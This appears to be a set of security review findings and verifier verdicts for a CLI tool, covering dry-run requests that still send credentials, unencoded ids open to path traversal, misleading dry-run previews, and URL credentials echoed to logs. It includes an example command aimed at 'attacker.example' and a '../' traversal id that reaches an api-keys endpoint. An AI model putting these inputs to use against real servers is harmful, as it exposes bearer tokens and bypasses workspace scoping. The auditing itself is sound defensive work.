samples.summary: New docs assert a blanket "a dry run never reaches the network" guarantee, but six sibling read commands still send an authenticated request under --dry-run
samples.evidence:
The diff adds to docs/design/cli.md §8.2: "A dry run never reaches the network, so it burns no rate limit and emits no access log even when the command is harmless." That is now a documented security/operational guarantee for the whole flag, but only four commands were fixed. Still unguarded and fetching under `--dry-run`, each attaching the caller's `Authorization: Bearer <api key|access token>` header (http-client.ts:62-66):
  - packages/cli/src/commands/notes.ts:35 (`notes list`) and :76 (`notes get`)
  - packages/cli/src/commands/slides.ts:40 (`slides list`) and :81 (`slides get`)
  - packages/cli/src/commands/files.ts:85 (`files list`) and :105 (`files get`)
  - packages/cli/src/commands/sheets-export.ts:39 (`sheets export`, which also writes the fetched data to disk)
None of these action handlers reads `opts.dryRun` at all (verified by grep for `dryRun` across packages/cli/src). Attack/abuse chain: an operator or agent that trusts the new blanket sentence runs e.g. `wafflebase slides get <id> --server https://attacker.example --dry-run` (or a pre-flight against a server it has not vetted) expecting a printed URL and no traffic; the CLI instead performs a live GET and hands the bearer credential to that host, and on the real server produces the access-log entry and rate-limit consumption the doc says will not happen. Fix is either to gate those commands too or to scope the sentence to the four commands actually changed.
searchedFor: Grep 'getCells\(|getCell\(|listTabs\(|listDocuments\(|getDocument\(' in packages/cli/src to enumerate every read call site
Read of notes.ts:28-82, slides.ts:28-87, files.ts:70-111, sheets-export.ts:20-59 to confirm no dry-run branch
Read docs/design/cli.md §8.2 (lines 806-830) for the exact wording

samples.summary: Document/tab/cell identifiers are interpolated into request paths without encodeURIComponent, so a caller-supplied id can retarget the credentialed request outside the workspace scope (path traversal / request-target injection)
samples.evidence: `getDocument(id)` builds `GET ${base}/documents/${id}` with no encoding (http-client.ts:199); same pattern at :330 listTabs, :340/:342 getCells (docId/tabId raw, only `range` encoded), :345 getCell, :348 setCell, :354 deleteCell, :361 batchCells. `base` is `${server}/api/v1/workspaces/${workspace}` (:82-85). `fetch` parses the string with the WHATWG URL parser, which collapses dot segments, so `docId = "../../../../workspaces/victim-ws/api-keys"` turns `wafflebase docs get <id>` into `GET ${server}/workspaces/victim-ws/api-keys` with the user's `Authorization: Bearer ...` header attached — i.e. the client-side workspace scoping in the path is bypassable and any endpoint on the configured host can be reached with the caller's credentials (only server-side authz stands between). The boundary is real because the CLI is explicitly built to be driven by agents (docs/design/cli.md:22-26, 1024-1029), which routinely pass document ids taken from untrusted content; the CLI then acts as a confused deputy. `downloadFileDocument` already uses `encodeURIComponent(docId)` (:254), showing the intended convention the other builders skip. The change under review propagates the same unencoded interpolation into new code (cells.ts:24, docs.ts:126, tabs.ts:15). Confidence is medium because exploitability depends on the backend's own authorization on the reached endpoint and on ids coming from an untrusted source.

samples.summary: The dry-run preview prints the raw pre-normalization URL, so a docId/tab containing '../' or '#' previews a different target than the request that would actually be sent
samples.evidence: The new preview builds `/documents/${docId}/tabs/${tab}/cells...` (cells.ts:24-29) and printDryRun concatenates it into a string (dry-run.ts:12-18) that is never run through `new URL(...)`. The real request path goes through `fetch`, whose URL parser removes dot segments and drops everything after `#`. So `--dry-run` on `docs get 'x/../../../workspaces/other/api-keys'` (docs.ts:126) or on a docId ending in `#` prints one target while the non-dry-run invocation of the very same argv would hit another. Since docs/design/cli.md:1027 tells agents to use `--dry-run` as the artifact a user approves before the real call, the preview is exactly the wrong place for that divergence — approving the printed string does not approve the request that follows. Encoding the segments (or printing `new URL(url).toString()`) makes preview and request agree.

samples.summary: printDryRun echoes the resolved server URL verbatim to stdout, so credentials embedded in a configured server URL (userinfo form) are printed; the change extends this to read commands
samples.evidence: `printDryRun` emits `${config.server.replace(/\/$/,'')}/api/v1/workspaces/${config.workspace}${path}` (dry-run.ts:12-24). `config.server` comes straight from `--server`, `WAFFLEBASE_SERVER`, the session file, or the config profile with no sanitisation (config.ts:90-94, 154-158). A server value of the `https://user:token@host` form — accepted by fetch and therefore a plausible way a user pins a proxy-authenticated endpoint — is reproduced verbatim into stdout, where agent transcripts and CI logs capture it. This is pre-existing in printDryRun, but the change under review newly routes four read commands (including the ones an agent runs as harmless pre-flight) through it, widening the exposure. Stripping userinfo before printing would close it.

Read of notes.ts:28-82, slides.ts:28-87, files.ts:70-111, sheets-export.ts:20-59 to confirm no dry-run branch
Read docs/design/cli.md §8.2 (lines 806-830) for the exact wording

verdict.reason: The reviewer's code facts check out — notes.ts:35/:76, slides.ts:40/:81, files.ts:85/:105 and sheets-export.ts:39 genuinely have no opts.dryRun branch, and there is no global interception (getClient is a bare `new HttpClient(...)` at root.ts:38-40; HttpClient.request fetches unconditionally at http-client.ts:166-186; printDryRun is only ever reached from explicit per-command branches such as notes.ts:55/:89/:107/:135/:195). So no counterexample exists and the absence is real. It is nevertheless not a defect in the Security lane. The unguarded path issues exactly the same authenticated GET the command issues without the flag; no permission gate is missing, weakened, inverted, or bypassable, nothing is injected, and no secret is exposed to an unintended party — the bearer header (http-client.ts:59-69, :137) is sent only to the server the operator themself supplied via --server/profile (root.ts:64-67), which is where it goes in normal operation. Every step of the proposed abuse chain ("--server https://attacker.example --dry-run") is executed by the victim with their own flags; there is no attacker-controlled input. printDryRun (client/dry-run.ts:6-25) prints only method/URL/body and never the credential, so the guarded commands expose nothing less than the unguarded ones. Additionally the doc sentence at docs/design/cli.md:824-827 is the second sentence of a bullet whose first sentence enumerates precisely the four commands that were implemented, so it reads as scoped rather than as a blanket flag-wide security guarantee. What remains is an unimplemented UX flag plus doc wording that could be tightened — a correctness/docs issue the Security rubric explicitly defers ("general logic bugs (correctness lens)"), not an authorization, secrets, injection, crypto, SSRF, or traversal weakness.

verdict.reason: Verified directly in the repo. `base` is built as `${server}/api/v1/workspaces/${workspace}` (http-client.ts:82-85) and `request()` concatenates `${this.base}${path}` (http-client.ts:172) before handing it to `fetch` with an `Authorization: Bearer` header (http-client.ts:59-69, 137, 148). Every id-bearing path builder interpolates the caller-supplied identifier raw: getDocument (199), updateDocument (202), deleteDocument (205), doc/slides/note content (283, 289, 300, 307, 317, 323), listTabs (330), createTab (333), renameTab (336), getCells (342, only `range` encoded at 341), getCell (345), setCell (348), deleteCell (354), batchCells (361). The contrast the reviewer cites is real - downloadFileDocument does use encodeURIComponent (254) - so the intended convention exists and is skipped elsewhere. A repo-wide grep over packages/cli/src for encodeURIComponent|validateId|isValidId yields only cells.ts:26, http-client.ts:254 and http-client.ts:341, i.e. there is no id-shape validation anywhere; the callers pass argv straight through (cells.ts:16-39, tabs.ts:12-19 and 63-78, docs.ts:123-130), so no already-guarded ground exists. Because fetch resolves the URL with the WHATWG parser, dot segments collapse before the request, letting a hostile id escape the /api/v1/workspaces/<ws>/ prefix while the user's credentials remain attached - and sensitive endpoints on the same host exist (listApiKeys/revokeApiKey, 365-389). The dry-run printers reproduce the same unencoded construction (cells.ts:24-29, tabs.ts:15, docs.ts:126), so --dry-run does not surface the discrepancy either. This is path/request-target injection and unsafe input handling, squarely in the Security lane and blocking at major severity; residual doubt concerns only backend authz, which is a confidence issue, not grounds to drop.
